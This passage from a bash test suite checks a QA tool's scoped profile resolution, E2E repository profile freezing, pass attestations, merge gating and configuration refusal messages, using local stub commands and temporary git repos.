assert_eq "$(ac_meta_read "$pf/.crew/qa/agent-pf-shipb-r1.profile/ship/test-receipt.env" qualification)" \
  "not-qualifies" "omitting --ship-run freezes not-qualifies even while 'current' points at a qualifying run"
pfrun pf-shipc --ship-run runB >/dev/null 2>&1 || true
assert_eq "$(ac_meta_read "$pf/.crew/qa/agent-pf-shipc-r1.profile/ship/test-receipt.env" qualification)" \
  "not-qualifies" "a receipt for another target freezes not-qualifies"

# never stores raw secret values: fixtures reach the profile as REFERENCE names
# only (both present here, so no ask-user), never an expanded credential.
printf 'qa:\n  serve: "echo pf-serve"\n  health: "true"\n  fixtures:\n    profile: safe-local-fixture\n    resolver: fleet-secret-profile\n' >"$pf_cfg"
AC_CREW_ID=pf-implement AC_VERIFY_BIN="$TMP/stub/ac-verify" \
  "$QA" agent --target HEAD --task pf-fx --brief "$qa_brief" --evidence "$pf_ev" >/dev/null
fxprof="$pf/.crew/qa/agent-pf-fx-r1.profile/profile.json"
assert_eq "$(jq -r .fixtures.profile "$fxprof")" "safe-local-fixture" "fixtures.profile is a reference name"
assert_eq "$(jq -r .fixtures.resolver "$fxprof")" "fleet-secret-profile" "fixtures.resolver is a reference name"

# --- scoped preflight: ready, conflict, and the caller-arg refusals ----------
pfs="$(make_repo pfs)"
pfs_cfg="$AC_HOME/projects/pfs.yaml"
pfs_ev="$TMP/pfs-ev"
printf '# Repo knowledge: pfs\n\n- scope orchid = orchid-service | src: cmd:true | at: deadbeef 2026-07-21 | by: fam\n\n## Superseded\n\n' \
  >"$AC_HOME/records/repo-knowledge/pfs.md"
cat >"$pfs_cfg" <<'EOF'
qa:
  health_timeout: 30
  scopes:
    orchid:
      seed: "echo seed-orchid"
      apps:
        orchid-service:
          serve: "echo serve-orchid-service; sleep 30"
          health: "echo health-orchid-service"
EOF
cd "$pfs"

# profile-ready (scoped): a valid scope/app pair freezes a keyed profile.
out="$(AC_CREW_ID=pfs-implement AC_VERIFY_BIN="$TMP/stub/ac-verify" \
  "$QA" agent --target HEAD --task pfs-ok --brief "$qa_brief" --evidence "$pfs_ev" \
  --scope orchid --app orchid-service)"
assert_contains "$out" "QA_PROFILE_STATUS=profile-ready" "a complete scoped pair resolves ready"
sprof="$pfs/.crew/qa/agent-pfs-ok-r1.profile/profile.json"
assert_file "$sprof" "the scoped preflight freezes a profile"
assert_eq "$(jq -r .profile_key "$sprof")" "pfs/orchid/orchid-service" "the scoped key is project/scope/app"
assert_eq "$(jq -r .target.scope "$sprof")" "orchid" "the profile records the scope"
assert_eq "$(jq -r .target.app "$sprof")" "orchid-service" "the profile records the app"
assert_eq "$(jq -r .service.serve "$sprof")" "echo serve-orchid-service; sleep 30" "service.serve resolves app-level"
assert_eq "$(jq -r .service.seed "$sprof")" "echo seed-orchid" "service.seed resolves scope-level"

# profile-conflict (scoped): a scope outside the closed list disagrees.
pfsrun() {
  local want="$1" task="$2" before out; shift 2
  before="$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')"
  out="$(AC_CREW_ID=pfs-implement AC_VERIFY_BIN="$TMP/stub/ac-verify" \
    "$QA" agent --target HEAD --task "$task" --brief "$qa_brief" --evidence "$pfs_ev" "$@" 2>&1)" \
    && fail "expected $want for $task"
  assert_contains "$out" "QA_PROFILE_STATUS=$want" "$task -> $want"
  assert_eq "$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')" "$before" "$want spawns no verifier pane"
}
pfsrun profile-conflict pfs-ghost --scope ghost --app orchid-service
pfsrun profile-conflict pfs-badapp --scope orchid --app nope

# F9 UNDECLARED SCOPE BLOCK (scoped): the config carries a scope repo-knowledge
# does not declare. F27: cmd_agent's refusal now flows through the SAME chain
# as cmd_start's qa_validate_selection (qa_selection_precedence) - it carries
# the chain's own "F9 UNDECLARED SCOPE BLOCK" tag, not a separately-worded
# reimplementation.
cat >>"$pfs_cfg" <<'EOF'
    cedar:
      seed: "echo seed-cedar"
      apps:
        cedar-service:
          serve: "echo serve-cedar-service"
          health: "echo health-cedar-service"
EOF
out="$(AC_CREW_ID=pfs-implement AC_VERIFY_BIN="$TMP/stub/ac-verify" \
  "$QA" agent --target HEAD --task pfs-f9 --brief "$qa_brief" --evidence "$pfs_ev" \
  --scope orchid --app orchid-service 2>&1)" && fail "F27: an undeclared yaml scope must still refuse"
assert_contains "$out" "F9 UNDECLARED SCOPE BLOCK" \
  "F27: cmd_agent's undeclared-scope text now matches qa_validate_selection's canonical tag"
cat >"$pfs_cfg" <<'EOF'
qa:
  health_timeout: 30
  scopes:
    orchid:
      seed: "echo seed-orchid"
      apps:
        orchid-service:
          serve: "echo serve-orchid-service; sleep 30"
          health: "echo health-orchid-service"
EOF

# A scoped project with no selector named is a caller-argument refusal (name
# the scope), not a durable-source status - and still spawns nothing.
before="$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')"
out="$(AC_CREW_ID=pfs-implement AC_VERIFY_BIN="$TMP/stub/ac-verify" \
  "$QA" agent --target HEAD --task pfs-noscope --brief "$qa_brief" --evidence "$pfs_ev" 2>&1)" \
  && fail "a scoped project with no scope must refuse"
assert_contains "$out" "must name one" "a scoped project demands a named scope"
assert_eq "$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')" "$before" "the no-scope refusal spawns nothing"
rm -f "$AC_HOME/records/repo-knowledge/pfs.md"

# --- Story 3: separate-E2E-repo profile freeze (dual-ref) --------------------
# A scoped project whose config maps a SEPARATE E2E repository freezes the E2E
# block into the profile: the exact E2E SHA (from ref_policy), the resolved
# local repo path, the product workdir, the endpoint-env mapping, and the
# command. The profile also records its own canonical hash (profile_sha256).
pfe="$(make_repo pfe)"
e2e_repo="$(make_repo pfe-e2e)"
e2e_repo_real="$(cd "$e2e_repo" && pwd -P)"
e2e_sha="$(git -C "$e2e_repo" rev-parse HEAD)"
pfe_cfg="$AC_HOME/projects/pfe.yaml"
pfe_ev="$TMP/pfe-ev"
printf '# Repo knowledge: pfe\n\n- scope orchid = orchid-service | src: cmd:true | at: deadbeef 2026-07-21 | by: fam\n\n## Superseded\n\n' \
  >"$AC_HOME/records/repo-knowledge/pfe.md"
cat >"$pfe_cfg" <<EOF
qa:
  health_timeout: 30
  e2e:
    repo: $e2e_repo
    ref_policy: configured-default-branch-head
    command: "echo e2e-run"
  scopes:
    orchid:
      seed: "echo seed-orchid"
      e2e:
        workdir: orchid
        endpoint_env:
          BASE_URL: "\$QA_BASE_URL"
        fixture_profile: orchid-local-safe
      apps:
        orchid-service:
          serve: "echo serve-orchid-service; sleep 30"
          health: "echo health-orchid-service"
EOF
cd "$pfe"
out="$(AC_CREW_ID=pfe-implement AC_VERIFY_BIN="$TMP/stub/ac-verify" \
  "$QA" agent --target HEAD --task pfe-ok --brief "$qa_brief" --evidence "$pfe_ev" \
  --scope orchid --app orchid-service)"
assert_contains "$out" "QA_PROFILE_STATUS=profile-ready" "a scoped E2E profile resolves ready"
eprof="$pfe/.crew/qa/agent-pfe-ok-r1.profile/profile.json"
assert_file "$eprof" "the E2E preflight freezes a profile"
assert_eq "$(jq -r .e2e.repo "$eprof")" "$e2e_repo" "profile records the configured E2E repo identity"
assert_eq "$(jq -r .e2e.repo_path "$eprof")" "$e2e_repo_real" "profile resolves the local E2E repo path"
assert_eq "$(jq -r .e2e.ref "$eprof")" "$e2e_sha" "profile freezes the exact E2E SHA (ref_policy)"
assert_eq "$(jq -r .e2e.ref_policy "$eprof")" "configured-default-branch-head" "profile records the ref policy"
assert_eq "$(jq -r .e2e.workdir "$eprof")" "orchid" "profile records the product E2E workdir"
assert_eq "$(jq -r .e2e.command "$eprof")" "echo e2e-run" "profile records the E2E command"
# shellcheck disable=SC2016 # This asserts a deliberately deferred environment reference.
assert_eq "$(jq -r '.e2e.endpoint_env.BASE_URL' "$eprof")" '$QA_BASE_URL' "profile records the endpoint-env mapping"
assert_eq "$(jq -r .e2e.fixture_profile "$eprof")" "orchid-local-safe" "scope-level e2e fixture profile is a reference name"
assert_eq "$(jq -r '.profile_sha256 | length' "$eprof")" "64" "the profile records its own canonical hash"
# The canonical hash EXCLUDES volatile allocation paths and the timestamp, so a
# re-resolve at the same refs + config yields an identical profile hash.
psha1="$(jq -r .profile_sha256 "$eprof")"
AC_CREW_ID=pfe-implement AC_VERIFY_BIN="$TMP/stub/ac-verify" \
  "$QA" agent --target HEAD --task pfe-ok2 --brief "$qa_brief" --evidence "$pfe_ev" \
  --scope orchid --app orchid-service >/dev/null
assert_eq "$(jq -r .profile_sha256 "$pfe/.crew/qa/agent-pfe-ok2-r1.profile/profile.json")" "$psha1" \
  "the profile hash is stable across runs at the same refs (excludes volatile paths/timestamp)"

# needs-profile: qa.e2e.repo is set but the local clone does not resolve.
printf 'qa:\n  serve: "echo pfe-flat"\n  health: "true"\n  e2e:\n    repo: no-such-e2e-clone\n    command: "echo x"\n' >"$AC_HOME/projects/pfeflat.yaml"
pfeflat="$(make_repo pfeflat)"
cd "$pfeflat"
before="$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')"
out="$(AC_CREW_ID=pfeflat-implement AC_VERIFY_BIN="$TMP/stub/ac-verify" \
  "$QA" agent --target HEAD --task pfeflat-x --brief "$qa_brief" --evidence "$TMP/pfeflat-ev" 2>&1)" \
  && fail "an unresolvable qa.e2e.repo must refuse"
assert_contains "$out" "QA_PROFILE_STATUS=needs-profile" "an unresolvable E2E clone is needs-profile"
assert_eq "$(wc -l <"$QA_VERIFY_LOG" | tr -d ' ')" "$before" "the E2E needs-profile spawns no verifier pane"
rm -f "$AC_HOME/records/repo-knowledge/pfe.md"

cd "$repo"

# --- Story 3: e2e runs from the E2E worktree workdir + endpoint-env + .env guard
# The facade hands the runtime bundle (its runtime E2E worktree + frozen
# workdir/endpoint map) into the source lease; ac-qa start consumes it and the
# e2e step runs the command from <e2e-worktree>/<workdir> under the
# minimal env PLUS the explicit endpoint-env mapping, refusing an undeclared
# developer .env.
e2erun_wt="$(make_repo e2e-run-wt)"
mkdir -p "$e2erun_wt/pkg"
printf 'fixture\n' >"$e2erun_wt/pkg/fixture.txt"
git -C "$e2erun_wt" add -A
git -C "$e2erun_wt" commit -qm "add product workdir"
e2erun_sha="$(git -C "$e2erun_wt" rev-parse HEAD)"
cat >"$qa_cfg" <<'EOF'
qa:
  serve: "echo s; sleep 30"
  health: "true"
  e2e:
    command: "pwd; echo BASE=$BASE_URL"
EOF
# shellcheck disable=SC2016 # The runtime bundle must retain the deferred reference.
stage_runtime_bundle "$repo" "$qa_cfg" proj "" "" "$e2erun_wt" "org/e2e" pkg \
  '{"BASE_URL":"$QA_BASE_URL"}'
AC_QA_WATCH=off "$QA" start --target HEAD --task e2erun >/dev/null
e2erd="$repo/.crew/qa/$(readlink "$repo/.crew/qa/current")"
assert_no_file "$repo/.crew/qa/profile-runtime" "start consumes the profiled runtime bundle"
assert_file "$e2erd/profile/runtime.json" "start preserves volatile runtime data inside the run bundle"
assert_eq "$(sed -n 's/^e2e_worktree=//p' "$e2erd/run.meta" | head -n1)" "$e2erun_wt" "run.meta records the E2E worktree"
assert_eq "$(sed -n 's/^e2e_ref=//p' "$e2erd/run.meta" | head -n1)" "$e2erun_sha" "run.meta records the E2E ref"
assert_eq "$(sed -n 's/^profile_sha256=//p' "$e2erd/run.meta" | head -n1)" \
  "$(jq -r .profile_sha256 "$e2erd/profile/profile.json")" "run.meta records the profile hash"
printf 'QA_BASE_URL=http://127.0.0.1:9911\nQA_PORT=9911\n' >"$e2erd/ports.env"
qa_case E2E-1 pass api --grade A --evidence "$(case_evidence E2E-1)" >/dev/null
e2eout="$("$QA" cmd e2e --cases E2E-1)"
assert_contains "$e2eout" "$e2erun_wt/pkg" "e2e runs from the product workdir in the E2E worktree"
assert_contains "$e2eout" "BASE=http://127.0.0.1:9911" "the endpoint-env name receives the runtime service URL"
# Undeclared .env in the E2E workdir refuses the run.
printf 'SECRET=leak\n' >"$e2erun_wt/pkg/.env"
enverr="$("$QA" cmd e2e --cases E2E-1 2>&1)" && fail "e2e must refuse an undeclared .env in the workdir"
assert_contains "$enverr" "undeclared .env" "the .env guard refuses and names the file"
rm -f "$e2erun_wt/pkg/.env"
# A run whose runtime bundle names no E2E worktree keeps the single-repo
# behavior: cmd e2e runs from the source repo (regression lock for flat projects).
AC_QA_WATCH=off "$QA" start --target HEAD --task flatrun >/dev/null
qa_case E2E-F pass api --grade A --evidence "$(case_evidence E2E-F)" >/dev/null
flatout="$("$QA" cmd e2e --cases E2E-F)"
assert_contains "$flatout" "BASE=" "a flat run still runs the e2e command"
case "$flatout" in *"$e2erun_wt"*) fail "a flat run must not use the E2E worktree" ;; esac

# --- Story 3: the dual-ref verdict binds source SHA, E2E SHA, profile hash ---
stage_runtime_bundle "$repo" "$qa_cfg" proj "" "" "$e2erun_wt" "org/e2e-suite" pkg '{}'
AC_QA_WATCH=off "$QA" start --target HEAD --task attest >/dev/null
attest_sha="$(git -C "$repo" rev-parse HEAD)"
"$QA" step pin completed >/dev/null
qa_case A-1 pass api --grade A >/dev/null
mk_png "$TMP/attest.png"
"$QA" visual "$TMP/attest.png" --case A-1 >/dev/null
prepare_pass
"$QA" finish passed >/dev/null
marker="$repo/.crew/qa/passed/$attest_sha"
assert_file "$marker" "finish passed mints the attestation marker"
assert_contains "$(cat "$marker")" "source_sha=$attest_sha" "the attestation binds the source SHA"
assert_contains "$(cat "$marker")" "e2e_repo=org/e2e-suite" "the attestation binds the E2E repo identity"
assert_contains "$(cat "$marker")" "e2e_sha=$e2erun_sha" "the attestation binds the exact E2E SHA"
assert_contains "$(cat "$marker")" "profile_sha256=$(sed -n 's/^profile_sha256=//p' "$repo/.crew/qa/$(readlink "$repo/.crew/qa/current")/run.meta")" \
  "the attestation binds the profile hash"
# A plain flat run (no profile/E2E) keeps a lean marker: no empty dual-ref noise.
AC_QA_WATCH=off "$QA" start --target HEAD --task attest-flat >/dev/null
flat_sha="$(git -C "$repo" rev-parse HEAD)"
rm -f "$repo/.crew/qa/passed/$flat_sha"
"$QA" step pin completed >/dev/null
qa_case F-1 pass api --grade A >/dev/null
mk_png "$TMP/attest-flat.png"
"$QA" visual "$TMP/attest-flat.png" --case F-1 >/dev/null
prepare_pass
flat_attestation="$("$QA" finish passed)"
fmarker="$repo/.crew/qa/passed/$flat_sha"
assert_no_file "$fmarker" "an unprofiled diagnostic run writes no merge marker"
assert_contains "$flat_attestation" "QA_ATTESTATION=none" "the diagnostic envelope names the absent attestation"
assert_contains "$flat_attestation" "QA_ATTESTATION_REASON=unprofiled" "the diagnostic envelope explains why"

# --- live dashboard (ac-qa-watch.sh --once): steps + case ledger + verdict ----
W="$BIN/ac-qa-watch.sh"
AC_QA_WATCH=off "$QA" start --target HEAD --task dash >/dev/null
"$QA" step pin completed >/dev/null
qa_case D-1 pass api --grade A >/dev/null
qa_case D-2 fail web --classification defect \
  --authority 'docs/ui.md:3 - the button stays enabled' --repro "$TMP/repro-ok.sh" >/dev/null
dash="$("$W" --repo "$repo" --once)"
assert_contains "$dash" "ac-qa dash" "dashboard header names the task"
assert_contains "$dash" "pin" "dashboard shows the step table"
assert_contains "$dash" "1 pass" "dashboard case ledger counts pass"
assert_contains "$dash" "1 fail" "dashboard case ledger counts fail"
assert_contains "$dash" "D-2" "dashboard lists recent cases"
qa_case D-2 pass web --grade B >/dev/null
mk_png "$TMP/dash.png"
"$QA" visual "$TMP/dash.png" --case D-2 >/dev/null
prepare_pass
"$QA" finish passed >/dev/null
assert_contains "$("$W" --repo "$repo" --once)" "run finished: passed" "dashboard reports the final verdict"

# --- qa.require_for_ship merge gate -------------------------------------------
# finish passed writes a durable pass attestation keyed by the verified sha;
# ac_qa_gate_ok enforces it only when the fleet-home config requires it.
# Every probe below sources ac-pipeline-lib.sh ALONGSIDE ac-lib.sh, exactly as
# the real merge helpers do: the gate reads the project yaml through
# ac_yaml_has, which lives there. Source only ac-lib.sh and the call is
# unbound - and it degrades SILENTLY, leaving the yaml side empty so the gate
# reaches the FLAT arm and is right for the wrong reason. That is the layering
# bug shipping green inside the suite meant to catch it.
sha="$(git -C "$repo" rev-parse HEAD)"
# (1) gate NOT enforced (no qa: require_for_ship in the home config).
# shellcheck disable=SC1091
. "$BIN/ac-lib.sh"
. "$BIN/ac-qa-lib.sh"
ac_qa_gate_ok "$repo" "$sha" || fail "gate must pass when not required"
# (2) require it, but no passing run recorded yet -> blocked.
cat >"$qa_cfg" << 'EOF'
qa:
  require_for_ship: true
  serve: "echo gate-serve; sleep 30"
  health: "true"
  health_timeout: 5
EOF
# The policy moved outside git, so create a new product head explicitly; the
# earlier dashboard pass must not satisfy this untested commit.
printf 'gate change\n' >>"$repo/file.txt"
git -C "$repo" add file.txt && git -C "$repo" commit -qm "gate target"
sha="$(git -C "$repo" rev-parse HEAD)"
assert_fails bash -c ". '$BIN/ac-lib.sh'; . '$BIN/ac-pipeline-lib.sh'; . '$BIN/ac-qa-lib.sh'; ac_qa_gate_ok '$repo' '$sha'"
# (3) a passing crew-qa run on that sha writes the attestation -> gate opens.
stage_runtime_bundle "$repo" "$qa_cfg" proj "" ""
printf 'unexpected\n' >"$repo/.crew/qa/profile-runtime/extra.txt"
out="$("$QA" start --target "$sha" --task gate-extra 2>&1)" \
  && fail "a runtime bundle with an unknown root entry must fail closed"
assert_contains "$out" "unknown bundle root entry" \
  "the runtime bundle rejects files outside its closed layout"
rm -f "$repo/.crew/qa/profile-runtime/extra.txt"
"$QA" start --target "$sha" --task gate-1 >/dev/null
qa_case G-1 pass api --grade A >/dev/null
mk_png "$TMP/gate.png"
"$QA" visual "$TMP/gate.png" --case G-1 >/dev/null
prepare_pass
"$QA" finish passed >/dev/null
assert_file "$repo/.crew/qa/passed/$sha"
bash -c ". '$BIN/ac-lib.sh'; . '$BIN/ac-pipeline-lib.sh'; . '$BIN/ac-qa-lib.sh'; ac_qa_gate_ok '$repo' '$sha'" || fail "gate opens after a passing run for the sha"
# (4) a different sha stays blocked (stale qa never satisfies a new head).
assert_fails bash -c ". '$BIN/ac-lib.sh'; . '$BIN/ac-pipeline-lib.sh'; . '$BIN/ac-qa-lib.sh'; ac_qa_gate_ok '$repo' '0000000000000000000000000000000000000000'"

# reap without docker is a calm no-op (assertable only where docker is truly
# absent; a dev machine with real docker exercises the live path).
rm -f "$TMP/stub/docker"
if command -v docker >/dev/null 2>&1; then
  "$QA" infra reap >/dev/null 2>&1 || fail "reap must not fail with real docker"
else
  assert_contains "$("$QA" infra reap)" "docker absent" "reap no-ops without docker"
fi

# --- SCOPED resolution: the precedence chain, and AC1-AC10 -------------------
# A two-scope fixture, so every refusal can be checked against a repo level
# that DOES carry a flat qa.serve - AC10 is asserted on every one of them: no
# refusal may print it, and none may resolve it.
sproj="$(make_repo sproj)"
scfg="$AC_HOME/projects/sproj.yaml"
srecdir="$AC_HOME/records/repo-knowledge"
mkdir -p "$srecdir"
write_map() {
  # write_map <entry-line>... - the repo-knowledge record's LIVE scope entries.
  { printf '# Repo knowledge: sproj\n\n'
    printf '%s\n' "$@"
    printf '\n## Superseded\n\n'; } >"$srecdir/sproj.md"
}
write_map \
  '- scope orchid = orchid-service, orchid-worker | src: cmd:true | at: deadbeef 2026-07-21 | by: fam' \
  '- scope cedar = cedar-service | src: cmd:true | at: deadbeef 2026-07-21 | by: fam'
cat >"$scfg" <<'EOF'
qa:
  serve: "echo STALE-REPO-LEVEL-SERVE"
  health_timeout: 900
  mocks_compose: docker/mocks.qa.yml
  e2e:
    repo: /tmp/e2e-repo
  scopes:
    orchid:
      seed: "echo seed-orchid"
      apps:
        orchid-service:
          serve: "echo serve-orchid-service; sleep 30"
          health: "echo health-orchid-service"
        orchid-worker:
          serve: "echo serve-orchid-worker; sleep 30"
          health: "echo health-orchid-worker"
    cedar:
      seed: "echo seed-cedar"
      apps:
        cedar-service:
          serve: "echo serve-cedar-service; sleep 30"
          health: "echo health-cedar-service"
EOF
cp "$scfg" "$scfg.full"
cd "$sproj"
sstart() { "$QA" start --target HEAD --task s1 "$@"; }
srefuse() {
  # srefuse <named-candidate> <start flags...> - the run REFUSES, its message
  # names the candidates, it never prints the repo-level value (AC10), and it
  # mints no run for the merge gate to ever trust.
  local want="$1" out
  shift
  out="$(sstart "$@" 2>&1)" && fail "expected refusal (wanted '$want'): $*"
  assert_contains "$out" "$want" "refusal names '$want'"
  case "$out" in *STALE-REPO-LEVEL-SERVE*) fail "AC10: a refusal printed the repo-level qa.serve" ;; esac
}

# AC1: the right serve/health for the named pair, and the named scope's seed.
sstart --scope orchid --app orchid-worker >/dev/null
assert_eq "$("$QA" config qa.serve)" "echo serve-orchid-worker; sleep 30" "AC1: app-level serve comes from the named app"
assert_eq "$("$QA" config qa.health)" "echo health-orchid-worker" "AC1: app-level health comes from the named app"
assert_eq "$("$QA" config qa.seed)" "echo seed-orchid" "AC1: seed comes from the named SCOPE"
# AC3: repo-level keys resolve for every scope, unchanged.
assert_eq "$("$QA" config qa.health_timeout)" "900" "AC3: health_timeout stays repo-level"
assert_eq "$("$QA" config qa.mocks_compose)" "docker/mocks.qa.yml" "AC3: mocks_compose stays repo-level"
assert_eq "$("$QA" config qa.e2e.repo)" "/tmp/e2e-repo" "AC3: e2e.repo stays repo-level"
# AC23: the names are PERSISTED as their own fields.
srd="$sproj/.crew/qa/$(readlink "$sproj/.crew/qa/current")"
assert_eq "$(sed -n 's/^scope=//p' "$srd/run.meta")" "orchid" "AC23: run.meta persists the scope"
assert_eq "$(sed -n 's/^app=//p' "$srd/run.meta")" "orchid-worker" "AC23: run.meta persists the app"

# AC21: no single run yields two scopes' values - a change spanning two scopes
# is covered only by TWO runs, each naming its own.
case "$("$QA" config qa.seed)" in *cedar*) fail "AC21: a orchid run reached cedar's seed" ;; esac
stage_runtime_bundle "$sproj" "$scfg" sproj/cedar/cedar-service cedar cedar-service
sstart --scope cedar --app cedar-service >/dev/null
assert_eq "$("$QA" config qa.seed)" "echo seed-cedar" "AC21: the second run covers the second scope"
assert_eq "$("$QA" config qa.serve)" "echo serve-cedar-service; sleep 30" "AC21: and its own app"
srd2="$sproj/.crew/qa/$(readlink "$sproj/.crew/qa/current")"
assert_eq "$(sed -n 's/^scope=//p' "$srd2/run.meta")" "cedar" "each run records its own scope"

# AC24: the envelope reports the proven profile, READ BACK from run.meta
# rather than re-derived - a field nothing reads is decoration, not a record.
qa_case S-1 pass api --grade A >/dev/null
mk_png "$TMP/s.png"
"$QA" visual "$TMP/s.png" --case S-1 >/dev/null
prepare_pass
env_out="$("$QA" finish passed)"
assert_contains "$env_out" "QA_SCOPE=cedar" "AC24: the envelope names the scope proved"
assert_contains "$env_out" "QA_APP=cedar-service" "AC24: the envelope names the app proved"
# AC25: the pass attestation is scope+app-BEARING - it does not write a bare
# passed/<sha> claiming the whole head. The names ride the FILENAME, so
# enumeration is a glob and two runs at one sha cannot collide.
ssha="$(git -C "$sproj" rev-parse HEAD)"
assert_file "$sproj/.crew/qa/passed/$ssha.cedar.cedar-service" "AC25: the marker names the profile it proved"
assert_no_file "$sproj/.crew/qa/passed/$ssha" "AC25: a scoped run writes no bare marker"
# ...and a second run at the SAME sha for the other scope coexists.
stage_runtime_bundle "$sproj" "$scfg" sproj/orchid/orchid-service orchid orchid-service
sstart --scope orchid --app orchid-service >/dev/null
qa_case S-2 pass api --grade A >/dev/null
"$QA" visual "$TMP/s.png" --case S-2 >/dev/null
prepare_pass
"$QA" finish passed >/dev/null
assert_file "$sproj/.crew/qa/passed/$ssha.orchid.orchid-service" "AC25: the second scope's marker"
assert_file "$sproj/.crew/qa/passed/$ssha.cedar.cedar-service" "AC25: neither overwrites the other"

# --- the refusals, one per row of the chain ---------------------------------
srefuse "Declared scopes: orchid cedar"                                                    # AC4 / F1
srefuse "'ghost' is not a declared scope" --scope ghost --app orchid-service             # AC5 / F2
srefuse "Members of orchid: orchid-service,orchid-worker" --scope orchid                          # AC7 / F4
srefuse "'cedar-service' is not a member of scope 'orchid'" --scope orchid --app cedar-service  # AC8 / F5
# AC2/AC7: a ONE-MEMBER scope is NOT special-cased. This is the criterion an
# implementer is likeliest to "helpfully" break with a member-count shortcut.
srefuse "Members of cedar: cedar-service" --scope cedar                                     # AC2

# AC32(b): a repeated selector refuses naming BOTH values - differing AND
# identical, so no "is it the same value?" branch exists for a bug to hide in.
srefuse "given twice" --scope orchid --scope cedar --app orchid-service
srefuse "given twice" --scope orchid --scope orchid --app orchid-service
srefuse "given twice" --scope orchid --app orchid-service --app orchid-worker
srefuse "given twice" --scope orchid --app orchid-service --app orchid-service

# AC9 / F6: a member app with no config block still has no profile identity.
awk '/^        orchid-worker:$/ { skip = 3 } skip > 0 { skip--; next } { print }' \
  "$scfg.full" >"$scfg"
srefuse "app 'orchid-worker' has no config block" --scope orchid --app orchid-worker
# Missing mechanics no longer block start: the operator may explicitly skip
# the whole serve step with one durable note.
grep -v 'health-orchid-worker' "$scfg.full" >"$scfg"
sstart --scope orchid --app orchid-worker >/dev/null
assert_fails "$QA" config qa.health
grep -v 'seed-orchid' "$scfg.full" >"$scfg"
sstart --scope orchid --app orchid-service >/dev/null
assert_fails "$QA" config qa.seed
"$QA" step serve skipped --note 'case-only round needs no service process' >/dev/null
cp "$scfg.full" "$scfg"

# AC6 / F3: a scope declared in the map with no block in the yaml. It does NOT
# resolve any repo-level value in its place.
write_map \
  '- scope orchid = orchid-service, orchid-worker | src: cmd:true | at: deadbeef 2026-07-21 | by: fam' \
  '- scope cedar = cedar-service | src: cmd:true | at: deadbeef 2026-07-21 | by: fam' \
  '- scope gw = gateway | src: cmd:true | at: deadbeef 2026-07-21 | by: fam'
srefuse "scope 'gw' is declared but the fleet-home config carries no qa.scopes.gw block" \
  --scope gw --app gateway

# AC29 / F9: a yaml block the map does not declare refuses, names the ghost AND
# every declared scope - asserted while the SELECTED scope is perfectly valid,
# because F9 checks the whole file.
write_map '- scope orchid = orchid-service, orchid-worker | src: cmd:true | at: deadbeef 2026-07-21 | by: fam'
srefuse "F9 UNDECLARED SCOPE BLOCK" --scope orchid --app orchid-service
out="$(sstart --scope orchid --app orchid-service 2>&1)" || true
assert_contains "$out" "cedar" "F9 names the undeclared block"
assert_contains "$out" "Declared scopes: orchid" "F9 names every scope the map DOES declare"

# AC28 / F8, both directions. (a) the yaml declares scopes, the map declares
# none - and the fixture carries a stale flat qa.serve that must never be run
# or printed: the regression test for the hole two-sided detection closes.
rm -f "$srecdir/sproj.md"
srefuse "F8 MODE MISMATCH" --scope orchid --app orchid-service
out="$(sstart 2>&1)" || true
assert_contains "$out" "record declares NONE" "F8(a) says which side declares scopes"
case "$out" in *STALE-REPO-LEVEL-SERVE*) fail "AC28(a): the stale flat qa.serve reached a refusal" ;; esac
# (b) the map declares a scope, the yaml carries no qa.scopes block.
write_map '- scope orchid = orchid-service | src: cmd:true | at: deadbeef 2026-07-21 | by: fam'
printf 'qa:\n  serve: "echo STALE-REPO-LEVEL-SERVE"\n' >"$scfg"
srefuse "carries no qa.scopes block" --scope orchid --app orchid-service
out="$(sstart 2>&1)" || true
assert_contains "$out" "record declares scopes (orchid)" "F8(b) says which side declares scopes"

# ...and an EMPTY `qa.scopes:` block is PRESENT, not absent. This is the
# ordinary half-authored state - the key lands before the first block under it
# - and reading it as absent drops the project to FLAT and runs the stale
# repo-level profile, which is the exact hole two-sided detection closes. The
# child list is empty in both legs, so only a PRESENCE test can tell them
# apart, and F8 must fire with no selector given at all.
rm -f "$srecdir/sproj.md"
printf 'qa:\n  serve: "echo STALE-REPO-LEVEL-SERVE"\n  scopes:\n' >"$scfg"
out="$(sstart 2>&1)" && fail "F2: an empty qa.scopes block must refuse, not fall through to FLAT"
assert_contains "$out" "F8 MODE MISMATCH" "an empty block is PRESENT, so exactly one side declares scopes"
assert_contains "$out" "present but still EMPTY" "the refusal says the block is there but unpopulated"
case "$out" in *STALE-REPO-LEVEL-SERVE*) fail "AC10: the stale flat serve reached the refusal" ;; esac

# step 0b: a GENUINELY flat project - no record, and no scopes key at all in
# the yaml. A selector on it refuses - and its message is
# NOT F8's. The two say different true things, and conflating them would tell
# a caller their config is half-migrated when they merely named a profile on a
# single-app repo.
rm -f "$srecdir/sproj.md"
printf 'qa:\n  serve: "echo STALE-REPO-LEVEL-SERVE"\n' >"$scfg"
out="$(sstart --scope orchid --app orchid-service 2>&1)" && fail "AC32(c): a selector on a flat project must refuse"
assert_contains "$out" "declares no scopes" "0b names that the project declares none at all"
case "$out" in *"MODE MISMATCH"*) fail "0b must not masquerade as F8" ;; esac
# ...and with NO selector the flat project starts exactly as before (AC11).
sstart >/dev/null || fail "a flat project with no selectors keeps today's behaviour"
assert_eq "$("$QA" config qa.serve)" "echo STALE-REPO-LEVEL-SERVE" "flat resolution is unchanged"

# step -1: an AMBIGUOUS map refuses the run outright and never degrades to
# flat - a map that read as "no scopes" is how a scoped project silently
# becomes flat.
write_map \
  '- scope orchid = orchid-service | src: cmd:true | at: deadbeef 2026-07-21 | by: fam' \
  '- scope orchid = imposter | src: cmd:true | at: deadbeef 2026-07-21 | by: forger'
out="$(sstart 2>&1)" && fail "an ambiguous map must refuse the run"
assert_contains "$out" "ambiguous" "the ambiguity refusal names itself"
rm -f "$srecdir/sproj.md"

# AC32(a): `agent` ACCEPTS the selectors - it dies on the unresolvable target,
# not on an unknown flag, which is what tells the two apart without standing
# up a pane. And it refuses a repeated selector at the same parse rung `start`
# does, before anything else runs.
out="$("$QA" agent --target nosuchref --task t1 --brief "$qa_brief" \
  --scope orchid --app orchid-service 2>&1)" \
  && fail "agent must still validate its target"
assert_contains "$out" "target does not resolve" "AC32(a): agent accepts --scope/--app"
out="$("$QA" agent --target HEAD --task t1 --scope orchid --scope cedar --app orchid-service 2>&1)" \
  && fail "agent must refuse a repeated selector"
